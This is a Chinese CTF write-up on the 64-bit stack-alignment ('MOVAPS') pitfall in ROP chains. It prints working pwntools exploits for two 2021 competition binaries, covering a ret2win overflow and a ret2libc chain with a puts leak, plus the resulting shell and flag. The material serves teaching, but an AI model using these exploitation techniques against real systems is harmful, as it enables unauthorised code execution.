# CTF 100步getshell之就差一步——The MOVAPS issue

当你完美的在栈上进行了布局，泄露了libc的地址，并且在libc中获得了syetem地址，获得了'/bin/sh'地址，此时此时就差一步sendline就打通了，可是你忽然发现，什么？为什么system失败了？地址也对啊，检查了一遍又一遍，全部都对啊。

此时的你开始怀疑，是不是Server上用了个新的libc？是不是地址获取错误？总之一万个问题向你来袭。但其实可能就只是一个`retn`解决的问题，在最后一步绊倒了你。这个问题其实就是`The
MOVAPS issue`

## 问题的起因

首先放上小明同学最近遇到的两个题目：

  1. Tamilctf2021，pwn，Nameserver

  2. DownUnderCTF2021，pwn，outBackdoor

有兴趣的小伙伴可以看看这两个题目。两个题目很相似，都是栈溢出，控制了eip.但是！都拿不到shell！！气人不

## DownUnderCTF2021-outBackdoor

DownUnderCTF中简单很多，直接提供了一个outBackdoor函数

保护机制

    
    
    Arch:     amd64-64-little  
    RELRO:    Partial RELRO  
    Stack:    No canary found  
    NX:       NX enabled  
    PIE:      No PIE (0x400000)

漏洞

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)  
    {  
    char v4[16]; // [rsp+0h] [rbp-10h] BYREF  
    ​  
    buffer_init(argc, argv, envp);  
    puts("\nFool me once, shame on you. Fool me twice, shame on me.");  
    puts("\nSeriously though, what features would be cool? Maybe it could play a song?");  
    gets(v4);  
    return 0;  
    }  
    int outBackdoor()  
    {  
    puts("\n\nW...w...Wait? Who put this backdoor out back here?");  
    return system("/bin/sh");  
    }  
    ​  
    //main的v4栈结构  
    -0000000000000010 var_10          db 16 dup(?)  
    +0000000000000000  s              db 8 dup(?)  
    +0000000000000008  r              db 8 dup(?)  
    +0000000000000010  
    +0000000000000010 ; end of stack variables

很简单，栈溢出，根据main的栈结构，我们知道只需要填充0x10+8个数据，就可以覆盖到eip。

是不是很简单？exploit如下：

    
    
    #!/usr/bin/python  
    #coding:utf-8[/size][/align][align=left][size=3]  
    from pwn import *  
    ​  
    context(os = 'linux', log_level='debug')   
    local_path = './outBackdoor'  
    addr = 'pwn-2021.duc.tf'  
    port = 31921  
    ​  
    is_local = 1  
      
    if is_local != 0:  
    io = process(local_path,close_fds=True)  
      
    else:  
    io = remote(addr, port)  
    # io = gdb.debug(local_path)  
    ​  
    elf=ELF(local_path)  
    p_backdoor=elf.symbols['outBackdoor']   
    ​  
    p_main = elf.symbols['main']  
    p_system = elf.symbols['system']  
    p_bin_sh = 0x4020CD  
    p_pop_rdi = 0x040125b  
    p_retn = 0x04011FA  
    p_ = 0x04011E7  
    ​  
    io.recvuntil(b"Maybe it could play a song")  
    #错误示范   
    get_shell = cyclic(16 + 8)  + p64(p_backdoor)  #错误示范   
    ​  
    # gdb.attach(io, "b * outBackdoor")  
    gdb.attach(io, "b * main")  
    io.sendline(get_shell)  
    ​  
    io.interactive()

感兴趣的同学可以检查一下，确认这段exp确实没有问题（至少现在看来是）。但是我们打一下会发现，有些奇怪的事情发生了。

程序输出了如下提示，很容易发现这段提示来自于outBackdoor函数，说明我们确实打入了outBackdoor，并且开始执行shell。但是无论你如何去打去试都打不进去？神马？为什么？

    
    
    W...w...Wait? Who put this backdoor out back here?

### 我的解法

    
    
    .text:00000000004011E7                 lea     rdi, command    ; "/bin/sh"  
    .text:00000000004011EE                 mov     eax, 0  
    .text:00000000004011F3                 call    _system  
    .text:00000000004011F8                 nop  
    .text:00000000004011F9                 pop     rbp  
    .text:00000000004011FA                 retn  
    ​  
    将上述错误示范替换成如下，成功拿到shell  
    p_ = 0x04011E7  
    get_shell = cyclic(16 + 8)  + p64(p_)  # 这个也可以

才疏学浅啊，虽然拿到了shell，但是却是迷之shell，为什么？没有细细思考这个问题，毕竟入门小白，体会不到出题大神的出题思路。所以这个问题悬而未解。

### 正解

直到有一天，我在CTFtime上看到了这道题的正确解法1，再次感受到了才疏学浅。

这个writeup的意思是，在这个链接2 中有这个问题的答案，只需要一个`retn`就可以了。

什么！默默的打开了这个链接，关键信息如下：

After searching the instruction`movaps segfault`I came across [this
site](https://ropemporium.com/guide.html)3 that explains the issue.

>  **The MOVAPS issue**
>
> If you're using Ubuntu 18.04 and segfaulting on a movaps instruction in
> buffered_vfprintf() or do_system() in the 64 bit challenges then ensure the
> stack is 16 byte aligned before returning to GLIBC functions such as
> printf() and system(). The version of GLIBC packaged with Ubuntu 18.04 uses
> movaps instructions to move data onto the stack in some functions. The 64
> bit calling convention requires the stack to be 16 byte aligned before a
> call instruction but this is easily violated during ROP chain execution,
> causing all further calls from that function to be made with a misaligned
> stack. movaps triggers a general protection fault when operating on
> unaligned data, so try padding your ROP chain with an extra ret before
> returning into a function or return further into a function to skip a push
> instruction.

Simply adding a call to a`ret`gadget before the call to`system`aligned bytes,
and allowed me to pop a shell.

简单总结：就是在64位的机器上，当你要调用printf或是system时，请保证`rsp&0xf==0`，说人话就是16字节对齐，最后4比特为0。当不满足上述条件的时候就报错。

好神奇啊！这就是说，我在构造payload的时候，栈不满足上述条件咯，祭出GDB.

![1632980757_61554f1586e1ba7818fb9.png!small?1632980740512](https://image.3001.net/images/20210930/1632980757_61554f1586e1ba7818fb9.png!small?1632980740512)

如上图所示，果真在调用system函数时最低4比特不为0（实际上那半个字节是8）

那么，我们自己的方法呢？

![1632980754_61554f1299598490aac7d.png!small?1632980737624](https://image.3001.net/images/20210930/1632980754_61554f1299598490aac7d.png!small?1632980737624)

确实，最低4比特为0，满足条件。

他的方法，加上`retn`，同样满足条件：

![1632980750_61554f0ee9bfe80917b9b.png!small?1632980733924](https://image.3001.net/images/20210930/1632980750_61554f0ee9bfe80917b9b.png!small?1632980733924)

这个时候，我明白一个道理： **我就是瞎猫碰见死耗子了呀！！！！**

下面分析一番，为什么我们碰见这个死耗子。

### 瞎猫碰见死耗子

#### 死耗子分析

如下，payload中唯一不一样的地方，但是却有的能拿到shell，有的不能：

    
    
    get_shell = cyclic(16 + 8)  + p64(p_retn) + p64(p_backdoor)   
    get_shell = cyclic(16 + 8)  + p64(p_)  # 这个也可以  
    get_shell = cyclic(16 + 8)  + p64(p_backdoor)  #错误示范 

我们就具体分析一下：

我们将断点断在main函数返回时的`retn`，

![1632980746_61554f0a41fb26e4388bf.png!small?1632980729254](https://image.3001.net/images/20210930/1632980746_61554f0a41fb26e4388bf.png!small?1632980729254)

随后执行retn，在栈顶弹出值赋给eip。此时栈结构变为

![1632980741_61554f05b74ce67fb9470.png!small?1632980724748](https://image.3001.net/images/20210930/1632980741_61554f05b74ce67fb9470.png!small?1632980724748)

可以看到，此时rsp是`rsp 0x7fffc8d60ec0`

随后进行了一步操作，将保存上一个栈的栈底，以便在本函数执行完毕后，恢复上一个栈。也就是这一步后，我们的栈顶rsp发生了变化

    
    
    ►  0x4011d7 <outBackdoor>       push   rbp

![1632980736_61554f00a2803fac57848.png!small?1632980719650](https://image.3001.net/images/20210930/1632980736_61554f00a2803fac57848.png!small?1632980719650)

并且这个变化保持到了system调用。自此，因为不满足`rsp&0xf==0`，失败!

好了，这个死耗子分析完了

#### 我为什么会碰上呢？

    
    
    p_ = 0x04011E7  
    get_shell = cyclic(16 + 8)  + p64(p_)  # 这个也可以

因为我的解法中，我直接将eip控制到了上图中0x4011e7的位置，完美跳过了push
rbp的操作，所以rsp是满足条件的。（不要问我为什么会想到这么“天才”的想法，因为我是“天猜”的）

#### 那么他的解法是什么原理呢？

    
    
    get_shell = cyclic(16 + 8)  + p64(p_retn) + p64(p_backdoor) 

可以看出，在进入backdoor函数之前，进行了一个`retn`操作。retn操作其实就是将栈顶的一个单位弹出到EIP中，在本例中就是rsp+8，所以先弹出一个单位，再在backdoor函数中压入一个单位，这不就平衡了！

## Tamilctf2021-Nameserver

无独有偶，在DownUnderCTF开始后的两天，TamilCTF也出了一道这么个题。

    
    
    Arch:     amd64-64-little  
    RELRO:    Partial RELRO  
    Stack:    No canary found  
    NX:       NX enabled  
    PIE:      No PIE (0x400000)  
    int __cdecl main(int argc, const char **argv, const char **envp)  
    {  
    char buf[32]; // [rsp+0h] [rbp-20h] BYREF  
    setbuf(_bss_start, 0LL);  
    puts("Welcome to TamilCTF");  
    printf("what is you name: ");  
    read(0, buf, 500uLL);  
    return 0;  
    }

典型的栈溢出，先通过puts泄露libc地址，然后在libc中找到system，/bin/sh的地址，ROP，getshell。哈哈，轻车熟路。exp如下：

    
    
    from pwn import *  
    from LibcSearcher import *  
    context(log_level='debug')  
    # context.terminal = ['terminator','-x','sh','-c']  
    local_path = './name-serv'  
    addr = '3.97.113.25'  
    port = 9001  
    is_local = 0  
    def debug(cmd):  
    gdb.attach(io, cmd)  
    if is_local:  
    io = process(local_path)  
    # debug('b * (vuln+0x121d - 0x11a2)')  
    # debug('b * (main)')  
    else:  
    io = remote(addr, port)  
    # io.recvuntil(b'what is you name: ')  
    # payload = cyclic(500)  
    p_pop_rdi= 0x0004006d3  
    elf = ELF(local_path)  
    p_puts_plt = elf.plt['puts']  
    p_puts_got = elf.got['puts']  
    p_read_got = elf.got['read']  
    p_start = elf.symbols['_start']  
    p_main  = elf.symbols['main']  
    p_read  = elf.symbols['read']  
    p_bss = elf.bss()  
    io.recvuntil(b'what is you name: ')  
    payload = b'a'*40 + p64(p_pop_rdi) + p64(p_puts_got) + p64(p_puts_plt) + p64(p_main)   
    io.send(payload)  
    p_puts_addr = u64(io.recvuntil(b'\n')[:-1].ljust(8, b'\x00'))  
    print(hex(p_puts_addr))  
    obj = ELF('/lib/x86_64-linux-gnu/libc.so.6')  
    libc_base = p_puts_addr - obj.symbols['puts'] #算出libc基地址  
    system = libc_base+obj.symbols['system']   #算出各函数的真实地址  
    bins = libc_base+next(obj.search(b'/bin/sh'))  
    # gdb.attach(io, '''  
    # 		b *0x400660  
    # 		c  
    # 		'''  
    # 		)  
    payload = b'a'*40 + p64(p_pop_rdi) + p64(bins)  + p64(system) #错误示范  
    io.send(payload)  
    io.interactive()

啊哈哈，错误示范（心路历程：一直以为是libc出了问题，试过了Libcsearcher，DynELF，别提多崩溃了）

    
    
    # 重点是这个retn的加入，原因是  
    '''  
    The MOVAPS issue  
    If you're segfaulting on a movaps instruction in buffered_vfprintf() or do_system() in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as printf() or system(). Some versions of GLIBC uses movaps instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a call instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. movaps triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra ret before returning into a function or return further into a function to skip a push instruction.  
    '''  
    p_retn = 0x00400661  
    payload = b'a'*40 + p64(p_pop_rdi) + p64(bins) +  p64(p_retn) + p64(system)

加上`retn`， get shell.

    
    
    what is you name: $ ls  
    [DEBUG] Sent 0x3 bytes:  
    b'ls\n'  
    [DEBUG] Received 0x26 bytes:  
    b'flag.txt\n'  
    b'libc.so.6\n'  
    b'name-serv\n'  
    b'start.sh\n'  
    flag.txt  
    libc.so.6  
    name-serv  
    start.sh  
    $ cat flag.txt  
    [DEBUG] Sent 0xd bytes:  
    b'cat flag.txt\n'  
    [DEBUG] Received 0x27 bytes:  
    b'TamilCTF{ReT_1s_M0rE_p0wErFu1_a5_LIBC}\n'  
    TamilCTF{ReT_1s_M0rE_p0wErFu1_a5_LIBC}

## 总结

本文主要对`The MOVAPS
issue`问题进行了解释，并结合DownUnderCTF2021和TamilCTF2021中相关的两个题目进行了分析。就题目本身而言，非常简单的ROP，考察的知识点就是`The
MOVAPS issue`，理解了就很容易。

最近看到一句话，再次刷新了我的认知，RE不仅考的是reverse的技巧，还考察了Google和GIThub的技巧；Crypto不仅考察了你的数学知识，还考察了你阅读paper的能力。

所以啊，你以为的真的是你以为的吗？

世界那么大，多出去看看吧。

## 参考资料

> [1]
> writeup<https://corruptedprotocol.medium.com/downunderctf-2021-outbackdoor-> pwn-ret2win-52e367bc497c>
>
> [2 ] <https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-> attack-but-not-hardcoded-system-call>
>
> [3 ] <https://ropemporium.com/guide.html>
>
> 16 Bytes Stack Alignment 的 MOVAPS 問題,<https://hack543.com/16-bytes-stack-> alignment-movaps-issue/>

